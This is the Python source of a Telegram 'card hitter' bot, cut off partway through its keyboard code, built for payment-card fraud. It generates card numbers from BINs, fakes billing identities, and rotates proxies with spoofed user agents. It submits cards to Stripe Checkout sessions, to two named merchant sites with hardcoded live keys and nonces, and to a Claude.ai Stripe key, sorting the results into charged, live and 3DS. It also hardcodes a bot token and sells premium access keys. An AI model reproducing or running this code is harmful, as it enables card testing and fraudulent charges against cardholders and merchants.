#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              HAMZZY ULTIMATE CARD HITTER v8.0                    ║
║         Stripe Checkout | Stripe Auth | Claude.ai               ║
║              Full Admin Panel | 3DS Forwarding                  ║
║                    Developer: @hamzzyhacket                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import random
import asyncio
import base64
import uuid
import hashlib
import threading
from datetime import datetime
from urllib.parse import urlparse, unquote, quote

import aiohttp
import requests
from fake_useragent import UserAgent
from colorama import Fore, Style, init

init(autoreset=True)
ua = UserAgent()

# ==================== CONFIGURATION ====================

BOT_TOKEN = "8843955618:AAG33mTdXIEdIB99YxvHHLStyFPurZn6-5w"
ADMIN_ID = 7738440580  # REPLACE WITH YOUR ACTUAL TELEGRAM ID

# Files
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
STATS_FILE = "stats.json"
BANNED_FILE = "banned.txt"
PROXY_HTTP_FILE = "proxies_http.txt"
PROXY_SOCKS4_FILE = "proxies_socks4.txt"
PROXY_SOCKS5_FILE = "proxies_socks5.txt"
PROXY_RESIDENTIAL_FILE = "proxies_residential.txt"

# Result files
CHARGED_FILE = "charged.txt"
LIVE_FILE = "live.txt"
THREEDS_FILE = "3ds.txt"
DECLINED_FILE = "declined.txt"
ERROR_FILE = "error.txt"
APPROVED_FILE = "approved.txt"

# ==================== DATA STRUCTURES ====================

users = {}
keys = {}
stats = {
    "total_checks": 0,
    "charged": 0,
    "live": 0,
    "approved": 0,
    "three_ds": 0,
    "declined": 0,
    "error": 0
}

# Session data
user_sessions = {}
pending_3ds = {}
mass_jobs = {}
user_proxy_preference = {}

# Proxy management
proxy_list = {"http": [], "socks4": [], "socks5": [], "residential": []}

# ==================== FILE MANAGEMENT ====================

def load_data():
    global users, keys, stats
    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
    except:
        users = {}
    
    try:
        with open(KEYS_FILE, 'r') as f:
            keys = json.load(f)
    except:
        keys = {}
    
    try:
        with open(STATS_FILE, 'r') as f:
            stats = json.load(f)
    except:
        stats = {
            "total_checks": 0,
            "charged": 0,
            "live": 0,
            "approved": 0,
            "three_ds": 0,
            "declined": 0,
            "error": 0
        }

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def save_keys():
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def save_stats():
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f, indent=2)

def save_result(card, status, message, amount="", gateway=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {card} | {status} | {message} | {gateway} | {amount}\n"
    
    if status == "CHARGED":
        with open(CHARGED_FILE, 'a') as f:
            f.write(line)
        stats["charged"] += 1
    elif status == "LIVE":
        with open(LIVE_FILE, 'a') as f:
            f.write(line)
        stats["live"] += 1
    elif status == "APPROVED":
        with open(APPROVED_FILE, 'a') as f:
            f.write(line)
        stats["approved"] += 1
    elif status == "3DS":
        with open(THREEDS_FILE, 'a') as f:
            f.write(line)
        stats["three_ds"] += 1
    elif status == "DECLINED":
        with open(DECLINED_FILE, 'a') as f:
            f.write(line)
        stats["declined"] += 1
    else:
        with open(ERROR_FILE, 'a') as f:
            f.write(line)
        stats["error"] += 1
    
    stats["total_checks"] += 1
    save_stats()

# ==================== USER MANAGEMENT ====================

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    user_id = str(user_id)
    if user_id in users:
        if users[user_id].get("premium", False):
            exp = users[user_id].get("expires", 0)
            if exp == 0 or time.time() < exp:
                return True
            else:
                users[user_id]["premium"] = False
                save_users()
    return False

def is_banned(user_id):
    user_id = str(user_id)
    if not os.path.exists(BANNED_FILE):
        return False
    try:
        with open(BANNED_FILE, 'r') as f:
            for line in f:
                if user_id in line:
                    parts = line.strip().split('|')
                    if len(parts) > 1:
                        exp = float(parts[1])
                        if exp == 0 or time.time() < exp:
                            return True
                    else:
                        return True
    except:
        pass
    return False

def add_premium(user_id, duration_days=30):
    user_id = str(user_id)
    if user_id not in users:
        users[user_id] = {"checks": 0, "premium": False, "expires": 0}
    
    users[user_id]["premium"] = True
    users[user_id]["expires"] = time.time() + (duration_days * 86400)
    save_users()

def remove_premium(user_id):
    user_id = str(user_id)
    if user_id in users:
        users[user_id]["premium"] = False
        users[user_id]["expires"] = 0
        save_users()

def add_check_count(user_id):
    user_id = str(user_id)
    if user_id not in users:
        users[user_id] = {"checks": 0, "premium": False, "expires": 0}
    users[user_id]["checks"] = users[user_id].get("checks", 0) + 1
    save_users()

def get_checks_left(user_id):
    user_id = str(user_id)
    if is_premium(user_id) or is_admin(user_id):
        return "Unlimited"
    if user_id in users:
        used = users[user_id].get("checks", 0)
        return max(0, 10 - used)
    return 10

# ==================== KEY MANAGEMENT ====================

def generate_key(duration_days=30, max_uses=1):
    key = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16].upper()
    keys[key] = {
        "duration": duration_days,
        "max_uses": max_uses,
        "used": 0,
        "created": time.time(),
        "active": True
    }
    save_keys()
    return key

def redeem_key(user_id, key):
    user_id = str(user_id)
    key = key.upper().strip()
    
    if key not in keys:
        return False, "Invalid key"
    
    key_data = keys[key]
    if not key_data.get("active", True):
        return False, "Key already used"
    
    if key_data.get("used", 0) >= key_data.get("max_uses", 1):
        return False, "Key has reached maximum uses"
    
    if user_id not in users:
        users[user_id] = {"checks": 0, "premium": False, "expires": 0}
    
    users[user_id]["premium"] = True
    current_exp = users[user_id].get("expires", 0)
    new_exp = max(current_exp, time.time()) + (key_data["duration"] * 86400)
    users[user_id]["expires"] = new_exp
    save_users()
    
    keys[key]["used"] = keys[key].get("used", 0) + 1
    if keys[key]["used"] >= keys[key]["max_uses"]:
        keys[key]["active"] = False
    save_keys()
    
    return True, f"Premium added for {key_data['duration']} days"

# ==================== PROXY MANAGEMENT ====================

def parse_proxy(proxy_string):
    """Parse various proxy formats including residential"""
    if not proxy_string:
        return None
    
    proxy_string = proxy_string.strip()
    
    # Residential proxy format (AnyIP, OwlProxy)
    parts = proxy_string.split(':')
    if len(parts) >= 4:
        host = parts[0]
        port = parts[1]
        user = parts[2]
        password = ':'.join(parts[3:])
        
        if 'anyip' in host.lower() or 'owlproxy' in host.lower() or 'residential' in proxy_string.lower():
            return {"url": f"http://{user}:{password}@{host}:{port}", "type": "residential", "raw": proxy_string}
        else:
            return {"url": f"http://{user}:{password}@{host}:{port}", "type": "http", "raw": proxy_string}
    
    # SOCKS5 format
    if proxy_string.startswith('socks5://'):
        return {"url": proxy_string, "type": "socks5", "raw": proxy_string}
    
    # SOCKS4 format
    if proxy_string.startswith('socks4://'):
        return {"url": proxy_string, "type": "socks4", "raw": proxy_string}
    
    # HTTP format with @
    if '@' in proxy_string:
        if '://' in proxy_string:
            return {"url": proxy_string, "type": "http", "raw": proxy_string}
        else:
            auth, hostport = proxy_string.split('@')
            if ':' in auth:
                user, pwd = auth.split(':', 1)
                return {"url": f"http://{user}:{pwd}@{hostport}", "type": "http", "raw": proxy_string}
    
    # host:port:user:pass
    if len(parts) == 4:
        host, port, user, pwd = parts
        return {"url": f"http://{user}:{pwd}@{host}:{port}", "type": "http", "raw": proxy_string}
    
    # host:port
    if len(parts) == 2:
        host, port = parts
        return {"url": f"http://{host}:{port}", "type": "http", "raw": proxy_string}
    
    return {"url": proxy_string, "type": "http", "raw": proxy_string}

def load_proxies_from_files():
    """Load proxies from all proxy files"""
    for ptype in proxy_list:
        proxy_list[ptype] = []
    
    file_map = {
        "http": PROXY_HTTP_FILE,
        "socks4": PROXY_SOCKS4_FILE,
        "socks5": PROXY_SOCKS5_FILE,
        "residential": PROXY_RESIDENTIAL_FILE
    }
    
    for ptype, file_path in file_map.items():
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxy = parse_proxy(line)
                        if proxy:
                            proxy["type"] = ptype
                            proxy_list[ptype].append(proxy)
    
    return sum(len(proxy_list[t]) for t in proxy_list)

def get_proxy_by_type(proxy_type):
    """Get a random proxy of specific type"""
    if proxy_type in proxy_list and proxy_list[proxy_type]:
        return random.choice(proxy_list[proxy_type])
    return None

def get_any_proxy():
    """Get any available proxy"""
    for ptype in ["residential", "http", "socks5", "socks4"]:
        if proxy_list[ptype]:
            return random.choice(proxy_list[ptype])
    return None

def remove_dead_proxy(proxy):
    """Remove dead proxy from memory and files"""
    if not proxy:
        return
    
    url = proxy.get("url")
    raw = proxy.get("raw", url)
    ptype = proxy.get("type", "http")
    
    # Remove from memory
    if ptype in proxy_list:
        proxy_list[ptype] = [p for p in proxy_list[ptype] if p.get("url") != url]
    
    # Remove from file
    file_map = {
        "http": PROXY_HTTP_FILE,
        "socks4": PROXY_SOCKS4_FILE,
        "socks5": PROXY_SOCKS5_FILE,
        "residential": PROXY_RESIDENTIAL_FILE
    }
    file_path = file_map.get(ptype, PROXY_HTTP_FILE)
    
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            lines = f.readlines()
        with open(file_path, 'w') as f:
            for line in lines:
                if raw not in line and url not in line:
                    f.write(line)

def save_proxy_to_file(proxy):
    """Save a proxy to appropriate file"""
    ptype = proxy.get("type", "http")
    raw = proxy.get("raw", proxy.get("url"))
    
    file_map = {
        "http": PROXY_HTTP_FILE,
        "socks4": PROXY_SOCKS4_FILE,
        "socks5": PROXY_SOCKS5_FILE,
        "residential": PROXY_RESIDENTIAL_FILE
    }
    
    file_path = file_map.get(ptype, PROXY_HTTP_FILE)
    with open(file_path, 'a') as f:
        f.write(raw + "\n")
    
    proxy_list[ptype].append(proxy)

def add_proxy_from_text(proxy_text):
    """Add proxy from text input"""
    proxy = parse_proxy(proxy_text)
    if proxy:
        save_proxy_to_file(proxy)
        return True, proxy["type"]
    return False, None

def save_user_proxy(user_id, proxy):
    """Save user's proxy preference"""
    user_proxy_preference[str(user_id)] = proxy

def get_user_proxy(user_id):
    """Get user's saved proxy preference"""
    return user_proxy_preference.get(str(user_id))

def clear_user_proxy(user_id):
    """Clear user's proxy preference"""
    if str(user_id) in user_proxy_preference:
        del user_proxy_preference[str(user_id)]

# ==================== CARD UTILITIES ====================

def luhn_check(card):
    card = re.sub(r'\D', '', card)
    total = 0
    for i, d in enumerate(card[::-1]):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def generate_luhn(partial):
    for d in range(10):
        test = partial + str(d)
        if luhn_check(test):
            return str(d)
    return "0"

def get_card_length(card):
    p2 = re.sub(r"\D", "", card)[:2]
    p3 = re.sub(r"\D", "", card)[:3]
    if p2 in ("34", "37"):
        return 15
    if p2 in ("30", "36", "38") or p3 in ("300", "305"):
        return 14
    return 16

def is_amex(card):
    p2 = re.sub(r"\D", "", card)[:2]
    return p2 in ("34", "37")

def generate_card(bin_pattern):
    parts = bin_pattern.strip().split("|")
    raw_bin = re.sub(r"[^0-9xX]", "", parts[0])
    mm_pat = parts[1].strip() if len(parts) > 1 else None
    yy_pat = parts[2].strip() if len(parts) > 2 else None
    cvv_pat = parts[3].strip() if len(parts) > 3 else None
    
    card = "".join(str(random.randint(0, 9)) if c in "xX" else c for c in raw_bin)
    tlen = get_card_length(card)
    if len(card) >= tlen:
        card = card[:tlen-1]
    while len(card) < tlen - 1:
        card += str(random.randint(0, 9))
    card += generate_luhn(card)
    
    yr = datetime.now().year
    mm = rnd_mm() if not mm_pat or mm_pat.upper() in ("XX", "X", "") else str(int(mm_pat)).zfill(2)
    yy = rnd_yy() if not yy_pat or yy_pat.upper() in ("XX", "X", "") else str(int(yy_pat))[-2:]
    cvv = rnd_cvv() if not cvv_pat or cvv_pat.upper() in ("XXX", "XXXX", "RND", "") else re.sub(r"[xX]", lambda _: str(random.randint(0, 9)), cvv_pat)
    
    return {
        "cc": card,
        "month": mm,
        "year": yy,
        "cvv": cvv,
        "full": f"{card}|{mm}|20{yy}|{cvv}"
    }

def rnd_mm():
    return str(random.randint(1, 12)).zfill(2)

def rnd_yy():
    return str(datetime.now().year + random.randint(1, 6))[-2:]

def rnd_cvv():
    return str(random.randint(0, 9999)).zfill(3)

def get_bin_info(bin6):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            return {
                "brand": d.get('brand', 'Unknown'),
                "type": d.get('type', 'N/A'),
                "level": d.get('level', 'N/A'),
                "bank": d.get('bank', 'Unknown'),
                "country": d.get('country_name', 'Unknown'),
                "flag": d.get('country_flag', '')
            }
    except:
        pass
    return {
        "brand": "Unknown",
        "type": "N/A",
        "level": "N/A",
        "bank": "Unknown",
        "country": "Unknown",
        "flag": ""
    }

def parse_card_string(card_string):
    """Parse card string: CC|MM|YY|CVV"""
    parts = card_string.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    return {
        "cc": parts[0].strip(),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip(),
        "cvv": parts[3].strip(),
        "full": f"{parts[0]}|{parts[1].zfill(2)}|{parts[2][-2:]}|{parts[3]}"
    }

# ==================== ADDRESS GENERATOR ====================

def generate_random_address():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    streets = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Blvd", "Lake Shore Dr", "Park Ave", "Broadway"]
    cities = [
        ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"),
        ("Houston", "TX", "77001"), ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
        ("San Antonio", "TX", "78201"), ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"),
        ("San Jose", "CA", "95101"), ("Austin", "TX", "78701"), ("Jacksonville", "FL", "32201")
    ]
    
    fn = random.choice(first_names)
    ln = random.choice(last_names)
    street_num = random.randint(100, 9999)
    street = random.choice(streets)
    city, state, zipcode = random.choice(cities)
    
    return {
        "name": f"{fn} {ln}",
        "first_name": fn,
        "last_name": ln,
        "address1": f"{street_num} {street}",
        "city": city,
        "state": state,
        "zip": zipcode,
        "country": "US",
        "email": f"{fn.lower()}.{ln.lower()}{random.randint(1, 999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}",
        "phone": f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    }

# ==================== STRIPE CHECKOUT HITTER ====================

class StripeCheckoutHitter:
    def __init__(self):
        self.session = None
        self.tracking = {
            "muid": str(uuid.uuid4()),
            "sid": str(uuid.uuid4()),
            "guid": str(uuid.uuid4())
        }
    
    async def init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=aiohttp.ClientTimeout(total=60)
            )
    
    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
    
    def decode_pk_from_url(self, url):
        result = {"pk": None, "cs": None, "merchant": None}
        
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' in url:
            try:
                hash_part = unquote(url.split('#')[1])
                decoded = base64.b64decode(hash_part)
                xored = ''.join(chr(b ^ 5) for b in decoded)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
                
                merchant_match = re.search(r'"business_name":"([^"]+)"', xored)
                if merchant_match:
                    result["merchant"] = merchant_match.group(1)
            except:
                pass
        
        return result
    
    async def charge(self, card, checkout_url, proxy=None):
        await self.init_session()
        
        decoded = self.decode_pk_from_url(checkout_url)
        pk = decoded.get("pk")
        cs = decoded.get("cs")
        
        if not pk or not cs:
            return {"status": "ERROR", "message": "Could not extract PK/CS from URL", "amount": "N/A", "merchant": "Unknown"}
        
        address = generate_random_address()
        
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": ua.random,
            "authorization": f"Bearer {pk}"
        }
        
        proxy_url = proxy.get("url") if proxy else None
        
        try:
            init_body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/init", headers=headers, data=init_body, proxy=proxy_url) as r:
                init_data = await r.json()
            
            if "error" in init_data:
                return {"status": "DECLINED", "message": init_data["error"].get("message", "Init failed"), "amount": "N/A", "merchant": "Unknown"}
            
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            pi = init_data.get("payment_intent") or {}
            acc = init_data.get("account_settings", {})
            
            total = 0
            currency = "USD"
            if lig:
                total = lig.get("total", 0)
                currency = lig.get("currency", "usd")
            elif inv:
                total = inv.get("total", 0)
                currency = inv.get("currency", "usd")
            else:
                total = pi.get("amount", 0)
                currency = pi.get("currency", "usd")
            
            if total > 0:
                if currency.upper() in ("JPY", "KRW", "VND"):
                    amount_str = f"{total} {currency.upper()}"
                else:
                    amount_str = f"${total/100:.2f} {currency.upper()}"
            else:
                amount_str = "Free / Trial"
            
            merchant = decoded.get("merchant") or acc.get("display_name") or acc.get("business_name") or "Stripe Checkout"
            checksum = init_data.get("init_checksum", "")
            
            pm_body = (
                f"type=card"
                f"&card[number]={card['cc']}"
                f"&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}"
                f"&card[exp_year]={card['year'][-2:]}"
                f"&billing_details[name]={quote(address['name'])}"
                f"&billing_details[email]={quote(address['email'])}"
                f"&billing_details[address][country]=US"
                f"&billing_details[address][line1]={quote(address['address1'])}"
                f"&billing_details[address][city]={quote(address['city'])}"
                f"&billing_details[address][state]={address['state']}"
                f"&billing_details[address][postal_code]={address['zip']}"
                f"&key={pk}"
                f"&muid={self.tracking['muid']}"
                f"&sid={self.tracking['sid']}"
                f"&guid={self.tracking['guid']}"
                f"&payment_user_agent={quote('stripe.js/f5e714652c; stripe-js-v3/f5e714652c; checkout')}"
                f"&time_on_page={random.randint(25000, 55000)}"
                f"&pasted_fields={quote('number')}"
            )
            
            async with self.session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=pm_body, proxy=proxy_url) as r:
                pm = await r.json()
            
            if "error" in pm:
                msg = pm["error"].get("message", "")
                if any(x in msg.lower() for x in ["security code", "cvc", "cvv", "incorrect"]):
                    return {"status": "LIVE", "message": msg, "amount": amount_str, "merchant": merchant}
                return {"status": "DECLINED", "message": msg, "amount": amount_str, "merchant": merchant}
            
            pm_id = pm.get("id")
            if not pm_id:
                return {"status": "ERROR", "message": "No payment method returned", "amount": amount_str, "merchant": merchant}
            
            conf_body = (
                f"payment_method={pm_id}"
                f"&expected_amount={total}"
                f"&key={pk}"
                f"&init_checksum={quote(checksum)}"
                f"&muid={self.tracking['muid']}"
                f"&sid={self.tracking['sid']}"
                f"&guid={self.tracking['guid']}"
                f"&expected_payment_method_type=card"
            )
            
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=headers, data=conf_body, proxy=proxy_url) as r:
                conf = await r.json()
            
            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "")
                
                if dc in ("incorrect_cvc", "incorrect_cvv", "insufficient_funds") or \
                   any(x in msg.lower() for x in ["security code", "insufficient funds", "cvc is incorrect"]):
                    return {"status": "LIVE", "message": f"{dc.upper()}: {msg}" if dc else msg, "amount": amount_str, "merchant": merchant}
                elif "challenge_required" in str(conf) or "requires_action" in str(conf) or "3d" in msg.lower():
                    challenge_url = self._extract_challenge_url(conf)
                    return {"status": "3DS", "message": "3DS Required", "amount": amount_str, "merchant": merchant, "challenge_url": challenge_url}
                elif "captcha" in msg.lower():
                    return {"status": "HCAPTCHA", "message": "Captcha Required", "amount": amount_str, "merchant": merchant}
                else:
                    return {"status": "DECLINED", "message": f"{dc.upper()}: {msg}" if dc else msg, "amount": amount_str, "merchant": merchant}
            
            pi = conf.get("payment_intent") or {}
            pi_status = pi.get("status", "")
            
            if pi_status == "succeeded":
                return {"status": "CHARGED", "message": "Payment successful!", "amount": amount_str, "merchant": merchant}
            elif pi_status == "requires_action":
                challenge_url = self._extract_challenge_url(conf)
                return {"status": "3DS", "message": "3DS Required", "amount": amount_str, "merchant": merchant, "challenge_url": challenge_url}
            else:
                return {"status": "DECLINED", "message": f"Status: {pi_status}", "amount": amount_str, "merchant": merchant}
                
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:100], "amount": "N/A", "merchant": "Unknown"}
    
    def _extract_challenge_url(self, response):
        try:
            match = re.search(r'"url":"(https?://[^"]+)"', str(response))
            if match:
                return match.group(1)
            match = re.search(r'(https?://hooks\.stripe\.com/[^\s"\']+)', str(response))
            if match:
                return match.group(1)
            return None
        except:
            return None

# ==================== AUTO-PROXY ROTATION ====================

async def charge_with_proxy_rotation(card, checkout_url, max_retries=3):
    """Auto-rotate proxies on failure"""
    proxy_types_to_try = ["residential", "http", "socks5", "socks4"]
    
    for attempt in range(max_retries):
        for ptype in proxy_types_to_try:
            proxy = get_proxy_by_type(ptype)
            if proxy:
                try:
                    result = await stripe_checkout.charge(card, checkout_url, proxy)
                    if result["status"] != "ERROR":
                        return result
                    else:
                        remove_dead_proxy(proxy)
                        continue
                except:
                    remove_dead_proxy(proxy)
                    continue
        # If no proxies work, try without proxy
        result = await stripe_checkout.charge(card, checkout_url, None)
        if result["status"] != "ERROR":
            return result
    
    return {"status": "ERROR", "message": "All proxies failed", "amount": "N/A", "merchant": "Unknown"}

# ==================== STRIPE AUTH CHECKER (WooCommerce) ====================

class StripeAuthChecker:
    def __init__(self):
        self.gateways = [
            {
                "name": "Early Learning Cafe",
                "url": "https://earlylearningcafe.com/my-account/add-payment-method/",
                "stripe_key": "pk_live_51FPDDoGHLDAy2EYzTZfqegcW1BoeDFkRAWAUxEpmi4FI0veROv421lMi7kUOABffgtwipuvItBz2vSSOuhj3o8vJ00w0aJMvBo",
                "nonce": "05797cb7f0"
            },
            {
                "name": "Equii Est",
                "url": "https://equii-est.co.uk/my-account/add-payment-method/",
                "stripe_key": "pk_live_51JXoSUKHaiw9oeF1eRiJufLS4Q69DDfDmTGWQo6kCkHPDQEjgkwUZJ8MyiNxCYzIEoDXOusPyipTV4jyyfqD9FxN004eSzpGG5",
                "nonce": "2435d4756a"
            }
        ]
    
    async def check_card(self, card, proxy=None):
        for gateway in self.gateways:
            try:
                result = await self._check_single_gateway(card, gateway, proxy)
                if result["status"] in ["APPROVED", "LIVE"]:
                    return result
            except:
                continue
        return {"status": "DECLINED", "message": "All gateways failed", "gateway": "Stripe Auth", "amount": "N/A"}
    
    async def _check_single_gateway(self, card, gateway, proxy=None):
        url = gateway["url"]
        stripe_key = gateway["stripe_key"]
        nonce = gateway["nonce"]
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = {"user-agent": ua.random}
            proxy_url = proxy.get("url") if proxy else None
            
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card['cc'],
                'card[cvc]': card['cvv'],
                'card[exp_month]': card['month'],
                'card[exp_year]': card['year'],
                'billing_details[address][country]': 'US',
                'key': stripe_key
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url) as r:
                pm_json = await r.json()
            
            if 'error' in pm_json:
                msg = pm_json['error'].get('message', '')
                if 'security code' in msg.lower() or 'cvc' in msg.lower():
                    return {"status": "LIVE", "message": msg, "gateway": gateway["name"], "amount": "N/A"}
                return {"status": "DECLINED", "message": msg, "gateway": gateway["name"], "amount": "N/A"}
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return {"status": "ERROR", "message": "No payment method", "gateway": gateway["name"], "amount": "N/A"}
            
            confirm_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            confirm_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce
            }
            
            ajax_url = url.replace('/add-payment-method/', '/wp-admin/admin-ajax.php')
            async with session.post(ajax_url, data=confirm_data, headers=confirm_headers, proxy=proxy_url) as r:
                result = await r.json()
            
            if result.get('success'):
                return {"status": "APPROVED", "message": "Card added successfully", "gateway": gateway["name"], "amount": "N/A"}
            else:
                error = result.get('data', {}).get('error', {}).get('message', 'Declined')
                if 'security code' in error.lower():
                    return {"status": "LIVE", "message": error, "gateway": gateway["name"], "amount": "N/A"}
                return {"status": "DECLINED", "message": error, "gateway": gateway["name"], "amount": "N/A"}

# ==================== CLAUDE.AI CHECKER ====================

class ClaudeChecker:
    async def check_card(self, card, proxy=None):
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = {"user-agent": ua.random}
            proxy_url = proxy.get("url") if proxy else None
            
            stripe_key = "pk_live_51MExQ9BjIQrRQnuxA9s9ahUkfIUHPoc3NFNidarWIUhEpwuc1bdjSJU9medEpVjoP4kTUrV2G8QWdxi9GjRJMUri005KO5xdyD"
            
            # Create payment method
            pm_data = {
                'type': 'card',
                'card[number]': card['cc'],
                'card[cvc]': card['cvv'],
                'card[exp_month]': card['month'],
                'card[exp_year]': card['year'],
                'key': stripe_key
            }
            
            async with session.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, proxy=proxy_url) as r:
                pm = await r.json()
            
            if 'error' in pm:
                msg = pm['error'].get('message', '')
                if 'security code' in msg.lower():
                    return {"status": "LIVE", "message": msg, "gateway": "Claude.ai", "amount": "$20.00"}
                return {"status": "DECLINED", "message": msg, "gateway": "Claude.ai", "amount": "$20.00"}
            
            pm_id = pm.get('id')
            if not pm_id:
                return {"status": "ERROR", "message": "No payment method", "gateway": "Claude.ai", "amount": "$20.00"}
            
            # Create setup intent for subscription
            setup_data = {
                'payment_method': pm_id,
                'confirm': 'true',
                'payment_method_types[]': 'card',
                'key': stripe_key
            }
            
            async with session.post('https://api.stripe.com/v1/setup_intents', data=setup_data, headers=headers, proxy=proxy_url) as r:
                setup = await r.json()
            
            if setup.get('status') == 'succeeded':
                return {"status": "APPROVED", "message": "Card added for subscription", "gateway": "Claude.ai", "amount": "$20.00"}
            elif setup.get('status') == 'requires_action':
                challenge_url = setup.get('next_action', {}).get('redirect_to_url', {}).get('url')
                if not challenge_url:
                    challenge_url = setup.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                return {"status": "3DS", "message": "3DS Required", "gateway": "Claude.ai", "amount": "$20.00", "challenge_url": challenge_url}
            else:
                return {"status": "DECLINED", "message": "Setup failed", "gateway": "Claude.ai", "amount": "$20.00"}

# ==================== TELEGRAM BOT ====================

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

bot = telebot.TeleBot(BOT_TOKEN)
stripe_checkout = StripeCheckoutHitter()
stripe_auth = StripeAuthChecker()
claude_checker = ClaudeChecker()

def get_session(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "step": "start",
            "mode": None,
            "method": None,
            "check_type": None,
            "gateway": None,
            "proxy": None,
            "proxy_type": None,
            "bin": None,
            "amount": None,
            "checkout_url": None,
            "cards": []
        }
    return user_sessions[user_id]

def clear_session(user_id):
    if user_id in user_sessions:
        user_sessions[user_id] = {
            "step": "start",
            "mode": None,
            "method": None,
            "check_type": None,
            "gateway": None,
            "proxy": None,
            "proxy_type": None,
            "bin": None,
            "amount": None,
            "checkout_url": None,
            "cards": []
        }

# ==================== KEYBOARDS ====================

def get_main_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🚀 START CHECK"), KeyboardButton("⚙️ SET PROXY"))
    markup.add(KeyboardButton("🔑 REDEEM KEY"), KeyboardButton("💰 BUY PREMIUM"))
    markup.add(KeyboardButton("📊 STATUS"), KeyboardButton("❌ REMOVE PROXY"))
    markup.add(KeyboardButton("🛑 STOP"), KeyboardButton("ℹ️ HELP"))
    markup.add(KeyboardButton("👑 ADMIN"), KeyboardButton("🔙 BACK"))
    return markup

def get_gateway_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("💳 STRIPE CHECKOUT"), KeyboardButton("🏦 STRIPE AUTH"))
    markup.add(KeyboardButton("🤖 CLAUDE.AI"), KeyboardButton("🔙 BACK"))
    return markup

def get_method_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("💳 CC METHOD"), KeyboardButton("🔢 BIN METHOD"))
    markup.add(KeyboardButton("🔙 BACK"))
    return markup

def get_check_type_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("📄 SINGLE"), KeyboardButton("📁 MASS"))
    markup.add(KeyboardButton("🔙 BACK"))
    return markup

def get_proxy_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🌐 HTTP PROXY"), KeyboardButton("🔒 SOCKS5 PROXY"))
